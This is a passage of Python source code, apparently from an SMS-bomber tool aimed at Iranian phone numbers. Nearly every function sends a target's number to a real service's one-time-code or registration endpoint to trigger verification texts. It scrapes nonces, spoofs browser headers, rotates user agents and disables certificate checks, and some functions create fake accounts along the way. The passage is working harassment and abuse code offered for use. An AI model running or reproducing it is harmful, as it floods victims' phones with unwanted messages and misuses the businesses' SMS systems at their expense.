            print(f'{g}(mootanroo) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mootanroo) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mootanroo Exception: {e}{a}')
        return False

def bodoroj(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    
    try:
        session = requests.Session()
        home_response = session.get("https://bodoroj.com/", timeout=10)
        
        # استخراج instance_id
        instance_id = None
        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
        match = re.search(instance_pattern, home_response.text)
        if match:
            instance_id = match.group(1)
        
        if not instance_id:
            instance_id = "83143976e95c57bfaa643ec00be89a6a"
        
        url = "https://bodoroj.com/wp-admin/admin-ajax.php"
        
        # استفاده از پارامترهای کامل
        payload = {
            "login_digt_countrycode": "+98",
            "digits_phone": digits_phone,
            "digits_email": "",
            "action_type": "phone",
            "digits_reg_name": "نام",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "rememberme": "1",
            "digits": "1",
            "instance_id": instance_id,
            "action": "digits_forms_ajax",
            "type": "login",
            "digits_redirect_page": "//bodoroj.com/?page=1&redirect_to=https%3A%2F%2Fbodoroj.com%2F",
            "digits_form": "fa139d7ce8",
            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fbodoroj.com%2F",
            "show_force_title": "1",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://bodoroj.com",
            "Referer": "https://bodoroj.com/",
        }
        
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        print(f'{g}[+] Status: {response.status_code}{a}')
        print(f'{g}[+] Response: {response.text}{a}')
        
        if response.status_code == 200:
            try:
                response_data = response.json()
                if response_data.get("success") is True:
                    print(f'{g}(bodoroj) {a}Code Sent')
                    return True
            except:
                if response.text.strip() == "1":
                    print(f'{g}(bodoroj) {a}Code Sent')
                    return True
        
        print(f'{r}[-] (bodoroj) Failed{a}')
        return False
            
    except Exception as e:
        print(f'{r}[!] bodoroj Exception: {e}{a}')
        return False


def riiha(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://www.riiha.ir/api/v1.0/authenticate"
    
    payload = {
        "mobile": formatted_phone,
        "mobile_code": "",
        "type": "mobile"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.riiha.ir",
        "Referer": "https://www.riiha.ir/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(riiha) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (riiha) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] riiha Exception: {e}{a}')
        return False


def niktakala(phone):
    import requests
    import uuid
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://niktakala.com/backend/customer/v2/otp-send/s/"
    
    payload = {
        "phone_number": formatted_phone,
        "is_forget_password": False
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "X-Customer-Signature": str(uuid.uuid4()),
        "accept-language": "fa-IR",
        "Origin": "https://niktakala.com",
        "Referer": "https://niktakala.com/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(niktakala) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (niktakala) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] niktakala Exception: {e}{a}')
        return False
        
def payonshoes(phone):
    import requests
    import re
    
    formatted_phone = "0" + phone.replace("+98", "")
    
    try:
        session = requests.Session()
        home_response = session.get("https://payonshoes.com/", timeout=10)
        
        # استخراج CSRF_TOKEN
        csrf_token = None
        csrf_patterns = [
            r'name="csrf" value="([a-f0-9]+)"',
            r'name="dig_nounce" value="([a-f0-9]+)"'
        ]
        
        for pattern in csrf_patterns:
            match = re.search(pattern, home_response.text)
            if match:
                csrf_token = match.group(1)
                break
        
        if not csrf_token:
            csrf_token = "11d30be44d"
        
        url = "https://payonshoes.com/wp-admin/admin-ajax.php"
        
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": formatted_phone,  # با صفر
            "csrf": csrf_token,
            "login": "2",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "json": "1",
            "whatsapp": "0"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://payonshoes.com",
            "Referer": "https://payonshoes.com/",
        }
        
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            if response.text.strip() == "1":
                print(f'{g}(payonshoes) {a}Code Sent')
                return True
        
        print(f'{r}[-] (payonshoes) Failed{a}')
        return False
            
    except Exception:
        print(f'{r}[-] (payonshoes) Failed{a}')
        return False


def mobilex(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://backend.mobilex.ir/api/v1/user/login/otp"
    
    payload = {
        "mobile": formatted_phone
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://mobilex.ir",
        "Referer": "https://mobilex.ir/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(mobilex) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (mobilex) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] mobilex Exception: {e}{a}')
        return False


def alldigitall(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = "https://api.alldigitall.ir/v1/auth/register?store_id=0"
    
    payload = {
        "firstname": "نام",
        "lastname": "خانوادگی", 
        "mobile": formatted_phone,
        "password": "12345678",
        "password_confirmation": "12345678"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://alldigitall.ir",
        "Referer": "https://alldigitall.ir/",
    }
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f'{g}(alldigitall) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (alldigitall) HTTP Error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] alldigitall Exception: {e}{a}')
        return False



def katonikhan(phone):
    import requests
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]}+{digits_phone[3:6]}+{digits_phone[6:]}"
    try:
        url = "https://katonikhan.com/wp-admin/admin-ajax.php"
        payload = {
            "phone": formatted_phone,
            "digt_countrycode": "+98",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "instance_id": "f2cf6e724788dcfaacd48173e7215663",
            "optional_data": "optional_data",
            "action": "digits_forms_ajax",
            "type": "register",
            "dig_otp": "otp",
            "digits": "1",
            "digits_redirect_page": "-1",
            "aio_special_field": "",
            "digits_form": "92e2d882a6",
            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://katonikhan.com",
            "Referer": "https://katonikhan.com/?login=true&page=1&redirect_to=https%3A%2F%2Fkatonikhan.com%2F",
        }
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            try:
                response_data = response.json()
                if response_data.get("success") is True:
                    print(f'{g}(katonikhan) {a}Code Sent')
                    return True
            except:
                pass
        return False
    except Exception:
        return False

def katoonistore(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    
    try:
        session = requests.Session()
        home_response = session.get("https://katoonistore.ir/", timeout=10)
        
        instance_id = None
        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
        match_obj = re.search(instance_pattern, home_response.text)
        if match_obj:
            instance_id = match_obj.group(1)
        if not instance_id:
            instance_id = "0ccd1ebf590232d8b06f9157a9654fa1"
        
        url = "https://katoonistore.ir/wp-admin/admin-ajax.php"
        payload = {
            "digits_reg_name": "م",
            "digt_countrycode": "+98",
            "phone": digits_phone,
            "digits_reg_تاریخ1747725841572": "",
            "jalali_digits_reg_تاریخ1747725841572463063470": "",
            "digits_process_register": "1",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "instance_id": instance_id,
            "optional_data": "optional_data",
            "action": "digits_forms_ajax",
            "type": "register",
            "dig_otp": "sms_otp",
            "digits": "1",
            "digits_redirect_page": "//katoonistore.ir/?page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
            "digits_form": "d3232db853",
            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
            "otp_resend": "true",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://katoonistore.ir",
            "Referer": "https://katoonistore.ir/",
        }
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get("success") is True:
                print(f'{g}(katoonistore) {a}Code Sent')
                return True
        
        print(f'{r}[-] (katoonistore) Failed{a}')
        return False
    except Exception:
        print(f'{r}[-] (katoonistore) Failed{a}')
        return False

def hajamooo(phone):
    import requests
    import re
    
    digits_phone = phone.replace("+98", "")
    formatted_phone = f"{digits_phone[:3]} {digits_phone[3:6]} {digits_phone[6:]}"
    
    try:
        session = requests.Session()
        home_response = session.get("https://hajamooo.ir/", timeout=10)
        
        nounce_value = None
        nounce_patterns = [
            r'name="dig_nounce" value="([a-f0-9]+)"',
            r'name="csrf" value="([a-f0-9]+)"',
            r'var nonce = "([a-f0-9]+)"',
        ]
        for pattern in nounce_patterns:
            match_obj = re.search(pattern, home_response.text)
            if match_obj:
                nounce_value = match_obj.group(1)
                break
        if not nounce_value:
            nounce_value = "34bcba36e0"
        
        url = "https://hajamooo.ir/wp-admin/admin-ajax.php"
        payload = {
            "action": "digits_check_mob",
            "countrycode": "+98",
            "mobileNo": digits_phone,
            "csrf": nounce_value,
            "login": "1",
            "username": "",
            "email": "",
            "captcha": "",
            "captcha_ses": "",
            "digits": "1",
            "json": "1",
            "whatsapp": "0",
            "mobmail": formatted_phone,
            "dig_otp": "",
            "dig_nounce": nounce_value
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://hajamooo.ir",
            "Referer": "https://hajamooo.ir/",
        }
        response = session.post(url, data=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            response_text = response.text.strip()
            if response_text == "1" or "success" in response_text.lower():
                print(f'{g}(hajamooo) {a}Code Sent')
                return True
        
        print(f'{r}[-] (hajamooo) Failed{a}')
        return False
    except Exception:
        print(f'{r}[-] (hajamooo) Failed{a}')
        return False

def ilozi(phone):
    try:
        digits_phone = phone.replace("+98", "")
        session = requests.Session()
        
        # لیست User-Agent های مختلف
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15"
        ]
        
        headers = {
            "User-Agent": random.choice(user_agents),
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://ilozi.com",
            "Referer": "https://ilozi.com/?login=true&page=2",
        }

        # دریافت صفحه اول
        home_response = session.get("https://ilozi.com/?login=true&page=2", 
                                   timeout=10, headers=headers)
        
        # استخراج مقادیر مورد نیاز
        instance_id = re.search(r'name="instance_id" value="([a-f0-9]+)"', home_response.text)
        digits_form = re.search(r'name="digits_form" value="([a-f0-9]+)"', home_response.text)

        # آماده سازی داده‌ها
        payload = {
            "login_digt_countrycode": "+98",
            "digits_phone": digits_phone,
            "action_type": "phone",
            "sms_otp": "",
            "otp_step_1": "1",
            "digits_otp_field": "1",
            "digits": "1",
            "instance_id": instance_id.group(1) if instance_id else "6fb17492e0d343df4e533a9deb8ba6b9",
            "action": "digits_forms_ajax",
            "type": "login",
            "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
            "digits_form": digits_form.group(1) if digits_form else "3780032f76",
            "_wp_http_referer": "/?login=true&page=2",
            "show_force_title": "1",
            "otp_resend": "true",
            "container": "digits_protected",
            "sub_action": "sms_otp"
        }

        # ارسال درخواست
        response = session.post("https://ilozi.com/wp-admin/admin-ajax.php", 
                               data=payload, headers=headers, timeout=10)

        # بررسی پاسخ
        if response.status_code == 200:
            if response.text.strip() == "1" or (response.json().get("success") if response.text else False):
                return True
        
        return False
            
    except Exception:
        return False



              
def achareh(phone):
    url = "https://api.achareh.co/v2/accounts/login/"
    payload = {"phone": "98" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Achareh) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Achareh) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Achareh Exception: {e}{a}')
        return False

def snappshop(phone):
    url = "https://apix.snappshop.co/auth/v1/pre-login"
    payload = {"mobile": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(SnappShop) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (SnappShop) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] SnappShop Exception: {e}{a}')
        return False

def bimebazar(phone):
    url = "https://bimebazar.com/accounts/api/login_sec/"
    payload = {"username": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Bimebazar) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Bimebazar) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Bimebazar Exception: {e}{a}')
        return False

def sibapp(phone):
    try:
        url = "https://api.sibapp.net/api/v1/user/register"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json; charset=UTF-8",
            "cache-control": "no-cache",
            "user-agent": random.choice(user_agents),
        }
        
        payload = {
            "phone_number": formatted_phone
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10,
            verify=False
        )
        
        if response.status_code in [200, 201]:
            print(f'{g}(sibapp) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] sibapp error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] sibapp exception: {e}{a}')
        return False


def komodaa(phone):
    try:
        url = "https://api.komodaa.com/api/v2.6/loginrc/request"
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "accept": "application/json",
            "content-type": "application/json",
            "web-user-agent": "komodaa/7.0.1.301 Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
            "install-ref": "WEB",
            "k-session-id": f"{uuid.uuid4().hex}-{uuid.uuid4().hex[:12]}",
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
        }
        
        payload = {
            "phone_number": formatted_phone
        }
        
        response = requests.post(
            url, 
            json=payload, 
            headers=headers, 
            timeout=10,
            verify=False
        )
        
        if response.status_code in [200, 201]:
            print(f'{g}(komodaa) SMS sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] komodaa error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] komodaa exception: {e}{a}')
        return False

 
def alopeyk_safir(phone):
    url = "https://api.alopeyk.com/safir-service/api/v1/login"
    payload = {"phone": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Alopeyk Safir) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Alopeyk Safir) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Alopeyk Safir Exception: {e}{a}')
        return False

def snapp(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        
        payload = {
            "cellphone": f"+98{formatted_phone}"
        }
        
        response = requests.post(
            "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[Debug] snapp Status: {response.status_code}{a}')
        print(f'{y}[Debug] snapp Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(snapp) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] snapp error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] snapp exception: {e}{a}')
        return False


def shahrfarsh(phone):
    url = "https://shahrfarsh.com/Account/Login"
    payload = {"phoneNumber": "0" + phone.split("+98")[1]}
    try:
        response = post(url, data=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(ShahrFarsh) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (ShahrFarsh) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] ShahrFarsh Exception: {e}{a}')
        return False
def tetherland(phone):
    url = "https://service.tetherland.com/api/v5/login-register"
    payload = {"mobile": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Tetherland) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Tetherland) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Tetherland Exception: {e}{a}')
        return False


def pindo(phone):
    pindo_url = "https://api.pindo.ir/v1/user/login-register/"
    pindo_payload = {"phone": "0"+phone.split("+98")[1]}
    try:
        pindo_response = post(timeout=5, url=pindo_url, json=pindo_payload).text
        if "success" in pindo_response.lower():  # یا شرط مناسب با پاسخ API
            print(f'{g}(Pindo) {a}Code Sent')
            return True
    except Exception as e:
        print(f'[!] Pindo Exception: {e}')
        return False

def drnext(phone):
    phoneNumber_zero = "0" + phone.split("+98")[1]  # تبدیل +98 به 0 اول
    url = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
    payload = {"source": "besina", "mobile": phoneNumber_zero}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(DrNext) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (DrNext) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] (DrNext) Exception: {e}{a}')

def gap(phone):
    try:
        # استخراج شماره بدون +
        formatted_phone = phone.split("+")[1] if "+" in phone else phone.replace("+98", "").replace("+", "")
        
        headers = {
            "Host": "core.gap.im",
            "accept": "application/json, text/plain, */*",
            "x-version": "4.5.7", 
            "accept-language": "fa",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36",
            "appversion": "web",
            "origin": "https://web.gap.im",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://web.gap.im/",
            "accept-encoding": "gzip, deflate, br"
        }
        
        response = requests.get(
            f"https://core.gap.im/v1/user/add.json?mobile=%2B{formatted_phone}",
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[gap] Status: {response.status_code}{a}')
        print(f'{y}[gap] Response: {response.text}{a}')
        
        if response.status_code == 200 and "OK" in response.text:
            print(f'{g}(gap) Code sent successfully! ✅{a}')
            return True
        else:
            print(f'{r}[-] gap error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] gap exception: {e}{a}')
        return False


def gapfilm(phone):
    try:
        # استخراج شماره بدون +98
        formatted_phone = phone.split("+98")[1] if "+98" in phone else phone.replace("+98", "").replace("+", "")
        
        headers = {
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'fa',
            'Browser': 'Opera',
            'BrowserVersion': '82.0.4227.33',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Host': 'core.gapfilm.ir',
            'IP': '185.156.172.170',
            'Origin': 'https://www.gapfilm.ir',
            'OS': 'Linux',
            'Referer': 'https://www.gapfilm.ir/',
            'SourceChannel': 'GF_WebSite',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'
        }
        
        payload = {
            "Type": 3,
            "Username": formatted_phone,
            "SourceChannel": "GF_WebSite",
            "SourcePlatform": "desktop",
            "SourcePlatformAgentType": "Opera",
            "SourcePlatformVersion": "82.0.4227.33",
            "GiftCode": None
        }
        
        response = requests.post(
            'https://core.gapfilm.ir/api/v3.1/Account/Login',
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[gapfilm] Status: {response.status_code}{a}')
        print(f'{y}[gapfilm] Response: {response.text}{a}')
        
        if response.status_code == 200:
            data = response.json()
            if data.get('Code') == 1:
                print(f'{g}(gapfilm) Code sent successfully! ✅{a}')
                return True
            else:
                print(f'{r}[-] gapfilm failed: {data.get("Message", "Unknown error")}{a}')
                return False
        else:
            print(f'{r}[-] gapfilm error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] gapfilm exception: {e}{a}')
        return False


def divar(phone):
    divarD = {"phone": phone.split("+98")[1]}
    try:
        divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", json=divarD).json()
        return divarR.get("authenticate_response") == "AUTHENTICATION_VERIFICATION_CODE_SENT"
    except Exception as e:
        print(f"{r}[!] Divar Exception: {e}")
        return False

def alibaba(phone):
    try:
        # استفاده از فرمت 0912... (با صفر)
        formatted_phone = "0" + phone.split("+98")[1] if "+98" in phone else "0" + phone.replace("+98", "")
        
        headers = {
            "Host": "ws.alibaba.ir",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR",
            "ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy",
            "Content-Type": "application/json;charset=utf-8",
            "Content-Length": "29",
            "Origin": "https://www.alibaba.ir",
            "Connection": "keep-alive",
            "Referer": "https://www.alibaba.ir/hotel"
        }
        
        payload = {"phoneNumber": formatted_phone}
        
        response = requests.post(
            'https://ws.alibaba.ir/api/v3/account/mobile/otp',
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[alibaba] Status: {response.status_code}{a}')
        print(f'{y}[alibaba] Response: {response.text}{a}')
        
        if response.status_code == 200:
            data = response.json()
            if data.get("result", {}).get("success") == True:
                print(f'{g}(alibaba) Code sent successfully! ✅{a}')
                return True
            else:
                print(f'{r}[-] alibaba failed: {data.get("message", "Unknown error")}{a}')
                return False
        else:
            print(f'{r}[-] alibaba error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] alibaba exception: {e}{a}')
        return False
        

def mek(phone):
    try:
        # فرمت شماره
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"

        # URL و payload
        url = "https://www.hamrah-mechanic.com/api/v1/membership/otp"
        payload = {
            "PhoneNumber": formatted_phone,
            "prevDomainUrl": None,
            "landingPageUrl": "https://www.hamrah-mechanic.com/carprice/saipa/zamyadpickup/type-2543/",
            "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
            "prevUrl": "https://www.hamrah-mechanic.com/profile/",
            "referrer": None
        }

        # هدرها
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "env": "prd",
            "Source": "ios",
            "X-Meta-Token": "413341",
            "_uti": str(uuid.uuid4())
        }

        # درخواست POST
        r = requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
        print(r.status_code, r.text)  # debug
        if r.status_code == 200:
            return True
        else:
            return False

    except Exception as e:
        print(f'{r}[!] HamrahMechanic Exception: {e}{a}')
        return False



def okorosh(phone):
    okJ = {
        "mobile": "0"+phone.split("+98")[1],
        "g-recaptcha-response": "dummy"
    }
    okU = 'https://my.okcs.com/api/check-mobile'
    okH = {'accept': 'application/json, text/plain, */*','content-type': 'application/json;charset=UTF-8'}
    try:
        okR = post(timeout=5, url=okU, headers=okH, json=okJ).text
        return 'success' in okR
    except Exception as e:
        print(f"{r}[!] OfoghKourosh Exception: {e}")
        return False

def smarket(phone):
    try:
        # استخراج شماره بدون +98 و اضافه کردن 0
        formatted_phone = "0" + phone.split("+98")[1] if "+98" in phone else "0" + phone.replace("+98", "")
        
        headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://snapp.market',
            'referer': 'https://snapp.market/',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'
        }
        
        # استفاده از GET به جای POST (همانطور که در URL مشخصه)
        response = requests.get(
            f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={formatted_phone}',
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[smarket] Status: {response.status_code}{a}')
        print(f'{y}[smarket] Response: {response.text}{a}')
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == True:
                print(f'{g}(SnapMarket) Code sent successfully! ✅{a}')
                return True
            else:
                print(f'{r}[-] smarket failed: {data.get("message", "Unknown error")}{a}')
                return False
        else:
            print(f'{r}[-] smarket error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] smarket exception: {e}{a}')
        return False

def digikala(phone):
    url = "https://api.digikala.com/v1/user/authenticate/"
    payload = {"username": "0" + phone.split("+98")[1]}
    try:
        response = post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Digikala) {a}Code Sent')
            return True
        else:
            print(f'{r}[-] (Digikala) Failed or No Response{a}')
    except Exception as e:
        print(f'{r}[!] Digikala Exception: {e}{a}')
        return False


def mrbilit(phone):
    import requests
    
    formatted_phone = "0" + phone.replace("+98", "")
    url = f"https://auth.mrbilit.ir/api/Token/send?mobile={formatted_phone}"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
